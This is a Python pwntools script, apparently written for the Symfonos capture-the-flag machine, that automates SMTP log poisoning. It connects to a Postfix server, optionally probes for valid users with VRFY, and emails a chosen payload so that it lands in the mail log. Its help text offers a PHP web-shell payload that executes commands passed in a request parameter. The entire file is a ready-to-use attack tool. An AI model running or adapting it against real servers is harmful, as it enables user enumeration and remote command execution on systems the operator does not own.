#!/usr/bin/python3

#Author: rudefish

from pwn import *
import argparse
from colorama import Fore

parser = argparse.ArgumentParser(description="A simple tool to test for SMTP Log Poisoning")
parser.add_argument("-t", "--target", metavar="TARGET ADDRESS", type=str, help="The target domain name/IP address. Example: symfonos.local", required="true")
parser.add_argument("-port", "--port", metavar="TARGET PORT", type=int, help="The port to connect to on the target", required="true")
parser.add_argument("-s", "--senderEmail", metavar="Sender mail", type=str, help="Your email address. Example: admin@rudefish.wtf", required="true")
parser.add_argument("-r", "--receiverEmail", metavar="Receiver Email", type=str, help="Receiver's email address. Example: helios@symfonos.localdomain", required="true")
parser.add_argument("-payload", "--payload", metavar="PAYLOAD", type=str, help="Payload to send. Example: <?php echo system($_REQUEST['cmd']);?>", required="true")
parser.add_argument("-v", "--verbose", action="store_true", help="Verbose mode")
parser.add_argument("--verify", action="store_true", help="Check to verify if the receiver is available on the mail server")
args = parser.parse_args()

class Connection():
    # Initialize Connection class
    def __init__(self, target, port, sender, receiver, payload):
        self.target = target
        self.port = port
        self.sender = sender.encode('utf-8')
        self.receiver = receiver.encode('utf-8')
        self.payload = payload.encode('utf-8')

        return None

    def sendPayload(self):
        if args.verbose:
            print(Fore.CYAN + f"[+] Initiating connection with {self.target} on port {self.port}")

        # Creating connection with pwntools
        target = remote(f'{self.target}', self.port)

        # Receiving banner
        target.recvuntil(b'220 symfonos.localdomain ESMTP Postfix (Debian/GNU)')
        target.sendline(b'EHLO %s' % self.sender)
        target.recvuntil(b'250 SMTPUTF8')


        # Checking if the specified user exists
        if args.verify:
            print(Fore.BLUE + f"[*] Verifying if user: {self.receiver.decode('utf-8')} exists on {self.target}")
            target.sendline(b'VRFY %s' % self.receiver)
            target.recvline()
            response = target.recvline()
            if response == (b'252 2.0.0 %s\r\n' % self.receiver):
                print(Fore.GREEN + f"[+] User {self.receiver.decode('utf-8')} exists on {self.target}")
            else:
                print(Fore.RED + f"[-] User {self.receiver.decode('utf-8')} does not exist on {self.target}. Closing connection" + Fore.RESET)
                target.close()
                exit(0)

        if args.verbose:
            print(Fore.BLUE + f"[*] Sending mail from {self.sender.decode('utf-8')}")

        # Sending the payload via email
        target.sendline(b'MAIL FROM:%s' % self.sender)
        target.recvuntil(b'250 2.1.0 Ok')

        if args.verbose:
            print(Fore.BLUE + f"[*] Sending mail to {self.receiver.decode('utf-8')}")

        # Checking if the specified user exists before sending payload
        target.sendline(b'RCPT TO:%s' % self.receiver)
        target.recvline()
        response = target.recvline()
        if response == (b'250 2.1.5 Ok\r\n'):
            if args.verbose:
                print(Fore.BLUE + f"[*] Sending payload data: {self.payload.decode('utf-8')}")
            target.sendline(b'DATA')
            target.recvuntil(b'354 End data with <CR><LF>.<CR><LF>')
            target.sendline(b'%s\r\n\r\n' % self.payload)
            target.sendline(b'.')
            target.sendline(b'\r\n')
            target.recvuntil(b'250 2.0.0 Ok')

            print(Fore.GREEN + f"[+] Payload sent. You can now attempt to execute commands with your payload on {self.target}." + Fore.RESET)

            if args.verbose:
                print(Fore.CYAN + "[-]Closing connection" + Fore.RESET)
            target.close()

        else:
            print(Fore.RED + f"User {self.receiver.decode('utf-8')} does not exist on {self.target}. Closing connection" + Fore.RESET)
            target.close()
            exit(0)


if __name__ == '__main__':
    if args:
        try:
            connection = Connection(args.target, args.port, args.senderEmail, args.receiverEmail, args.payload)
            connection.sendPayload()

        except KeyboardInterrupt:
            print(Fore.RED + "Ctrl + C detected. Closing connection")
            exit(0)

        except Exception as e:
            print(Fore.RED + f"{e}")

    else:
        parser.print_help()
